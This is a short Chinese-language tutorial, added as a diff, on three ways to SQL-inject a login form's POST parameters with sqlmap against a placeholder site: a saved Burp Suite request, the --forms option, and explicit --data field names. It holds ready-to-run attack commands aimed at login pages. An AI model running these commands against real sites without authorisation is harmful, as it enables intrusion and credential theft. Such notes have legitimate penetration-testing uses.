@@ -1,0 +1,29 @@
+
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+
+1.burpsuite + sqlmap
+利用burpsuite抓包保存为txt，利用sqlmap指定文本注入(此方法本人未实战过，是很普遍的方法，详情请自行百度)
+
+
+注入点：http://www.xx.com/Login.asp
+sqlmap.py -r test.txt -p Password 
+
+
+
+2.自动注册表单，截取数据。(直接在后面加[--forms])
+
+sqlmap -u "http://www.xx.com/Login.asp" --forms
+
+
+3.指定参数
+
+sqlmap.py -u "http://www.xx.com/Login.asp" --data "标签名1=数据1&标签名2=数据2&标签名3=数据3..." 
+
+注：填写的数据可以随意写，但标签名一定要与input标签中的name一致，不同的标签名对应不同的name
+
+sqlmap -u "http://www.xx.com/Login.asp" --data "Username=1&Password=1"
+
+注：Username与Password分别为Login.asp页面中的两个输入框的名字，将鼠标移动到输入框上面右击选择“审查元素”即可看到，每台网页的Login页面都不一定是一样的，渗透老鸟应该很容易懂。本人不才，可能解释的不太清楚。
